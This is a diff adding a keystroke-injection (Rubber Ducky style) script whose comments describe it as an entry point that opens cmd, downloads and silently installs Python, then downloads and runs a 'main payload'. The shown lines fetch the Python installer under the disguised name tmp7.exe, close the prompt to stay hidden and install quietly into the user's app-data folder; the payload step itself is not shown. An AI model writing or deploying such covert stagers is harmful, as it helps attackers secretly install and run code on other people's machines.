@@ -1,0 +1,32 @@
+REM Entry point for the python script
+REM Will open cmd
+REM Download python to temp directory 
+REM Install python quietly via cmdline
+REM Download and run the main payload
+
+DEFAULT_DELAY 50
+
+GUI r
+STRING cmd
+ENTER
+DELAY 500
+
+REM Download python
+REM start /b runs process in background - we want the terminal to stay on the screen for as little as possible
+STRING cd %localappdata%
+ENTER
+STRING start /b curl --create-dirs --output-dir %localappdata%\temp -o tmp7.exe "https://www.python.org/ftp/python/3.13.5/python-3.13.5-amd64.exe"
+ENTER
+
+REM Because curl is background we can kill command prompt
+ALT F4
+DELAY 10000
+
+GUI r
+STRING cmd
+ENTER
+DELAY 500
+
+REM Install python
+STRING start /b %localappdata%\temp\tmp7.exe /quiet TargetDir=%localappdata%\python1 AssociateFiles=0 CompileAll=1 Include_doc=0 Include_launcher=0 Include_tcltk=0 Include_test=0
+
